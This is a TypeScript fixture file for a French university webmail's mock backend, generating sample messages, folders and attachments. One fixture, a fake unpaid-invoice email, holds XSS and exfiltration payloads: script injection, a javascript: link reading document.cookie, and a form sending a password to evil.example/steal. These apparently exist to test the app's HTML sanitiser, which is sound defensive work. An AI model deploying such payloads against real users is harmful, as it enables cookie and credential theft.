/**
 * Jeu de données déterministe du backend mémoire.
 * Messages RFC 822 valides (en-têtes encodés RFC 2047, corps en base64),
 * construits de façon synchrone pour que `resetMockStore()` reste synchrone.
 */
import type { SpecialUse } from '#shared/types/mail'

export interface FixtureAttachment {
  filename: string
  contentType: string
  content: Buffer
  cid?: string
}

export interface FixtureMessage {
  folder: string
  from: string
  to: string
  cc?: string
  subject: string
  date: Date
  text?: string
  html?: string
  attachments?: FixtureAttachment[]
  seen: boolean
  flagged: boolean
  draft?: boolean
  /** En-têtes supplémentaires (ASCII), ex. X-Priority, Disposition-Notification-To. */
  headers?: Record<string, string>
}

/** `subscribed` absent = abonné. */
export const FOLDERS: Array<{ path: string; name: string; specialUse: SpecialUse | null; subscribed?: boolean }> = [
  { path: 'INBOX', name: 'Boîte de réception', specialUse: 'inbox' },
  { path: 'INBOX.Envoyés', name: 'Envoyés', specialUse: 'sent' },
  { path: 'INBOX.Brouillons', name: 'Brouillons', specialUse: 'drafts' },
  { path: 'INBOX.Archives', name: 'Archives', specialUse: 'archive' },
  { path: 'INBOX.Spam', name: 'Spam', specialUse: 'junk' },
  { path: 'INBOX.Corbeille', name: 'Corbeille', specialUse: 'trash' },
  { path: 'INBOX.Projets', name: 'Projets', specialUse: null },
  // R2 : sous-dossier et dossier non abonné
  { path: 'INBOX.Projets.2026', name: '2026', specialUse: null },
  { path: 'INBOX.Anciens cours', name: 'Anciens cours', specialUse: null, subscribed: false },
]

/** Quota du backend mémoire (R2.4) : 1 Gio. */
export const MOCK_QUOTA_LIMIT_BYTES = 1024 * 1024 * 1024

/** Générateur pseudo-aléatoire déterministe (mulberry32). */
function rng(seed: number): () => number {
  let a = seed
  return () => {
    a = (a + 0x6D2B79F5) | 0
    let t = Math.imul(a ^ (a >>> 15), 1 | a)
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}

function encodeWord(value: string): string {
  // eslint-disable-next-line no-control-regex
  return /^[\x20-\x7E]*$/.test(value) ? value : `=?UTF-8?B?${Buffer.from(value, 'utf8').toString('base64')}?=`
}

function encodeAddress(value: string): string {
  const m = value.match(/^(.*)<([^>]+)>$/)
  if (!m) return value
  const name = (m[1] ?? '').trim()
  return name ? `${encodeWord(name)} <${m[2]}>` : `<${m[2]}>`
}

function base64Lines(buf: Buffer): string {
  return buf.toString('base64').replace(/.{76}/g, '$&\r\n')
}

let boundaryCounter = 0
function boundary(): string {
  boundaryCounter += 1
  return `----=_mock_${boundaryCounter.toString(36)}`
}

function part(contentType: string, body: Buffer, extra: string[] = []): string {
  return [`Content-Type: ${contentType}`, 'Content-Transfer-Encoding: base64', ...extra, '', base64Lines(body)].join('\r\n')
}

function multipart(type: string, parts: string[]): string {
  const b = boundary()
  return [`Content-Type: multipart/${type}; boundary="${b}"`, '', ...parts.map(p => `--${b}\r\n${p}`), `--${b}--`, ''].join('\r\n')
}

export function buildFixtureRaw(m: FixtureMessage, index: number): Buffer {
  const domain = m.from.match(/@([^>]+)/)?.[1] ?? 'universite.example'
  const headers = [
    `From: ${encodeAddress(m.from)}`,
    `To: ${encodeAddress(m.to)}`,
    ...(m.cc ? [`Cc: ${encodeAddress(m.cc)}`] : []),
    `Subject: ${encodeWord(m.subject)}`,
    `Date: ${m.date.toUTCString()}`,
    `Message-ID: <fixture-${index}@${domain}>`,
    'MIME-Version: 1.0',
    ...Object.entries(m.headers ?? {}).map(([k, v]) => `${k}: ${v}`),
  ]

  const textPart = m.text !== undefined ? part('text/plain; charset=utf-8', Buffer.from(m.text, 'utf8')) : null
  const htmlPart = m.html !== undefined ? part('text/html; charset=utf-8', Buffer.from(m.html, 'utf8')) : null
  let body = textPart && htmlPart ? multipart('alternative', [textPart, htmlPart]) : (htmlPart ?? textPart ?? part('text/plain; charset=utf-8', Buffer.alloc(0)))

  const inline = (m.attachments ?? []).filter(a => a.cid)
  const files = (m.attachments ?? []).filter(a => !a.cid)
  if (inline.length) {
    body = multipart('related', [body, ...inline.map(a => part(a.contentType, a.content, [`Content-ID: <${a.cid}>`, `Content-Disposition: inline; filename="${a.filename}"`]))])
  }
  if (files.length) {
    body = multipart('mixed', [body, ...files.map(a => part(`${a.contentType}; name="${a.filename}"`, a.content, [`Content-Disposition: attachment; filename="${a.filename}"`]))])
  }
  return Buffer.from(`${headers.join('\r\n')}\r\n${body}`, 'utf8')
}

// Petit PNG 1×1 bleu et PDF minimal, générés en ligne (aucun fichier externe).
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64')
const PDF = Buffer.from('%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[]/Count 0>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n', 'latin1')

const PEOPLE = [
  'Camille Laurent <camille.laurent@universite.example>',
  'Hugo Bernard <hugo.bernard@universite.example>',
  'Léa Dubois <lea.dubois@universite.example>',
  'Scolarité <scolarite@universite.example>',
  'Nathan Moreau <nathan.moreau@universite.example>',
  'Chloé Petit <chloe.petit@universite.example>',
  'Service informatique <informatique@universite.example>',
  'Inès Garcia <ines.garcia@universite.example>',
]

const TOPICS = [
  ['Planning du projet tutoré 5.01', 'Voici le planning mis à jour pour le projet. Les soutenances auront lieu la semaine prochaine.'],
  ['Compte rendu de réunion', 'Merci à tous pour votre présence. Vous trouverez ci-dessous les points abordés.'],
  ['Changement de salle — cours de jeudi', 'Le cours de jeudi aura lieu en salle B204 au lieu de A102.'],
  ['Rendu du projet web', 'Pensez à déposer votre projet sur Moodle avant vendredi 18 h.'],
  ['Question sur le TP Vue.js', 'Est-ce que quelqu’un a réussi à faire fonctionner le routeur avec les paramètres dynamiques ?'],
  ['Stage : offre en agence', 'Une agence locale recherche un·e stagiaire en développement front-end pour le printemps.'],
  ['Maintenance du serveur mail', 'Le webmail sera indisponible samedi de 8 h à 10 h pour maintenance.'],
  ['Relances absences', 'Merci de justifier vos absences auprès de la scolarité dans les plus brefs délais.'],
  ['Photos de la journée portes ouvertes', 'Les photos de la JPO sont disponibles sur le drive du département.'],
  ['Café ☕ jeudi ?', 'On se retrouve à la cafétéria jeudi à 10 h pour parler du projet ?'],
] as const

/**
 * `me` : identité du titulaire de la boîte (nom affiché + adresse). Par défaut le
 * compte `dev` ; le mode démo (server/lib/demo/accounts.ts) réutilise ce même jeu
 * de données en l'adressant au compte visiteur généré.
 */
export function devFixtures(now: number, me = 'Dev Webmail <dev@universite.example>'): FixtureMessage[] {
  const random = rng(20260918)
  const day = 86_400_000
  const list: FixtureMessage[] = []

  for (let i = 0; i < 62; i++) {
    const topic = TOPICS[Math.floor(random() * TOPICS.length)] ?? TOPICS[0]
    const from = PEOPLE[Math.floor(random() * PEOPLE.length)] ?? 'Camille Laurent <camille.laurent@universite.example>'
    list.push({
      folder: 'INBOX',
      from,
      to: me,
      subject: topic[0],
      text: `Bonjour,\n\n${topic[1]}\n\nBonne journée,\n${from.split(' <')[0]}`,
      date: new Date(now - Math.floor(random() * 90 * day) - 3 * day),
      seen: random() > 0.3,
      flagged: random() > 0.85,
    })
  }

  // Messages remarquables, les plus récents.
  list.push(
    {
      folder: 'INBOX',
      from: 'Lettre du campus <newsletter@universite.example>',
      to: me,
      subject: 'La lettre du campus — septembre',
      text: 'La lettre du campus (version texte).',
      html: '<div style="font-family:Arial;max-width:600px"><img src="https://cdn.example.org/header.png" alt="En-tête" width="600"><h1 style="color:#0b57d0">La lettre du campus</h1><p>Rentrée, projets, événements : toutes les nouvelles du mois.</p><img src="https://cdn.example.org/photo-jpo.jpg" alt="JPO"><img src="https://cdn.example.org/agenda.png" alt="Agenda"><p><a href="https://www.example.org/lettre">Lire en ligne</a></p><img src="https://track.example.org/open.gif?u=dev" width="1" height="1" alt=""></div>',
      date: new Date(now - 2 * 3_600_000),
      seen: false,
      flagged: false,
    },
    {
      folder: 'INBOX',
      from: 'Service Comptabilité <compta@factures-urgentes.example>',
      to: me,
      subject: 'Facture impayée — action requise',
      html: '<p>Votre compte sera suspendu.</p><img src=x onerror="alert(1)"><a href="javascript:alert(document.cookie)">Payer maintenant</a><svg><script>alert(2)</script></svg><iframe src="https://evil.example/"></iframe><form action="https://evil.example/steal"><input name="password"></form><style>body{background:url("https://evil.example/p.gif")}</style><meta http-equiv="refresh" content="0;url=https://evil.example">',
      date: new Date(now - 5 * 3_600_000),
      seen: false,
      flagged: false,
    },
    {
      folder: 'INBOX',
      from: PEOPLE[3] ?? '',
      to: me,
      subject: 'Relevé de notes — semestre 4',
      text: 'Bonjour,\n\nVous trouverez votre relevé de notes en pièce jointe.\n\nLa scolarité',
      attachments: [{ filename: 'releve-notes-S4.pdf', contentType: 'application/pdf', content: PDF }],
      date: new Date(now - 26 * 3_600_000),
      seen: false,
      flagged: true,
    },
    {
      folder: 'INBOX',
      from: PEOPLE[2] ?? '',
      to: me,
      subject: 'Maquette avec logo intégré',
      html: '<p>Voici la maquette avec le logo :</p><p><img src="cid:logo@demo" alt="Logo" width="64" height="64"></p>',
      attachments: [{ filename: 'logo.png', contentType: 'image/png', content: PNG, cid: 'logo@demo' }],
      date: new Date(now - 30 * 3_600_000),
      seen: true,
      flagged: false,
    },
    {
      folder: 'INBOX',
      from: PEOPLE[4] ?? '',
      to: me,
      cc: 'Alice Martin <alice@universite.example>',
      subject: 'Un sujet très long pour vérifier que la liste des messages tronque correctement le texte sans casser la mise en page sur mobile à 320 pixels de large',
      text: 'Texte court.',
      date: new Date(now - 50 * 3_600_000),
      seen: true,
      flagged: false,
    },
  )

  // ─── Données R1 (parité Roundcube) ───
  const PNG_RED = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==', 'base64')
  list.push(
    {
      folder: 'INBOX',
      from: PEOPLE[5] ?? '',
      to: me,
      subject: 'Photos de la sortie',
      text: 'Voici les photos de la sortie au musée, et mes notes.',
      attachments: [
        { filename: 'photo-1.png', contentType: 'image/png', content: PNG },
        { filename: 'photo-2.png', contentType: 'image/png', content: PNG_RED },
        { filename: 'notes.txt', contentType: 'text/plain', content: Buffer.from('Notes de la sortie :\n- musée\n- déjeuner\n', 'utf8') },
      ],
      date: new Date(now - 7 * 3_600_000),
      seen: false,
      flagged: false,
    },
    {
      folder: 'INBOX',
      from: PEOPLE[1] ?? '',
      to: me,
      subject: 'Réunion : merci de confirmer',
      text: 'Bonjour,\n\nMerci de confirmer la lecture de ce message avant la réunion de lundi.\n\nHugo',
      headers: {
        'X-Priority': '1 (Highest)',
        'Importance': 'High',
        'Disposition-Notification-To': 'hugo.bernard@universite.example',
      },
      date: new Date(now - 9 * 3_600_000),
      seen: false,
      flagged: false,
    },
    {
      folder: 'INBOX',
      from: PEOPLE[0] ?? '',
      to: me,
      subject: 'Re: Planning',
      text: 'Ça me va pour jeudi.\n\n> Le planning proposé : jeudi 14 h.',
      html: '<p>Ça me va pour jeudi.</p><blockquote><p>Le planning proposé : jeudi 14 h.</p><blockquote><p>Message initial.</p></blockquote></blockquote>',
      date: new Date(now - 11 * 3_600_000),
      seen: true,
      flagged: false,
    },
  )

  for (let i = 0; i < 3; i++) {
    list.push({ folder: 'INBOX.Envoyés', from: me, to: PEOPLE[i] ?? '', subject: `Re: ${TOPICS[i]?.[0] ?? ''}`, text: 'Merci, bien reçu !', date: new Date(now - (i + 1) * 2 * day), seen: true, flagged: false })
  }
  list.push({ folder: 'INBOX.Brouillons', from: me, to: 'Camille Laurent <camille.laurent@universite.example>', subject: 'Brouillon : idées pour le projet tutoré', text: 'Quelques idées à compléter…', date: new Date(now - day), seen: true, flagged: false, draft: true })
  for (let i = 0; i < 2; i++) {
    list.push({ folder: 'INBOX.Corbeille', from: PEOPLE[6] ?? '', to: me, subject: `Ancienne notification ${i + 1}`, text: 'Notification supprimée.', date: new Date(now - (20 + i) * day), seen: true, flagged: false })
  }
  for (let i = 0; i < 3; i++) {
    list.push({ folder: 'INBOX.Projets', from: PEOPLE[i + 1] ?? '', to: me, subject: `Projet tutoré — étape ${i + 1}`, text: `Étape ${i + 1} du projet tutoré.`, date: new Date(now - (4 + i) * day), seen: i > 0, flagged: false })
  }
  // R2 : liste de diffusion, carte de visite, sous-dossier, dossier non abonné
  list.push({
    folder: 'INBOX',
    from: PEOPLE[7] ?? '',
    to: 'Liste Promo 2026 <liste-promo2026@universite.example>',
    subject: 'Liste Promo 2026 : réunion de rentrée',
    text: 'Bonjour à toutes et à tous,\n\nLa réunion de rentrée aura lieu mardi à 9 h en amphi.\n\nInès',
    headers: {
      'List-Id': 'Liste Promo 2026 <liste-promo2026.universite.example>',
      'List-Post': '<mailto:liste-promo2026@universite.example>',
    },
    date: new Date(now - 13 * 3_600_000),
    seen: false,
    flagged: false,
  })
  list.push({
    folder: 'INBOX',
    from: PEOPLE[2] ?? '',
    to: me,
    subject: 'Carte de visite de Léa',
    text: 'Voici ma carte de visite, pour ton carnet d’adresses.',
    attachments: [{
      filename: 'lea-dubois.vcf',
      contentType: 'text/vcard',
      content: Buffer.from([
        'BEGIN:VCARD',
        'VERSION:3.0',
        'N:Dubois;Léa;;;',
        'FN:Léa Dubois',
        'EMAIL;TYPE=WORK:lea.dubois@universite.example',
        'TEL;TYPE=CELL:+33 6 12 34 56 78',
        'ORG:Université Exemple',
        'TITLE:Enseignante',
        'END:VCARD',
        '',
      ].join('\r\n'), 'utf8'),
    }],
    date: new Date(now - 15 * 3_600_000),
    seen: true,
    flagged: false,
  })
  list.push({ folder: 'INBOX.Projets.2026', from: PEOPLE[4] ?? '', to: me, subject: 'Projet 2026 — cahier des charges', text: 'Le cahier des charges du projet 2026 est prêt.', date: new Date(now - 2 * day), seen: false, flagged: false })
  list.push({ folder: 'INBOX.Anciens cours', from: PEOPLE[3] ?? '', to: me, subject: 'Archives du semestre 1', text: 'Documents du semestre 1.', date: new Date(now - 200 * day), seen: true, flagged: false })
  list.push({ folder: 'INBOX.Spam', from: 'Gagnant <promo@loterie.example>', to: me, subject: 'Vous avez gagné un iPhone !!!', text: 'Cliquez ici.', date: new Date(now - 3 * day), seen: false, flagged: false })
  return list
}

export function aliceFixtures(now: number): FixtureMessage[] {
  const me = 'Alice Martin <alice@universite.example>'
  return Array.from({ length: 5 }, (_, i) => ({
    folder: 'INBOX',
    from: PEOPLE[i] ?? '',
    to: me,
    subject: `Message pour Alice n°${i + 1}`,
    text: `Bonjour Alice, ceci est le message ${i + 1}.`,
    date: new Date(now - (i + 1) * 86_400_000),
    seen: i > 2,
    flagged: false,
  }))
}
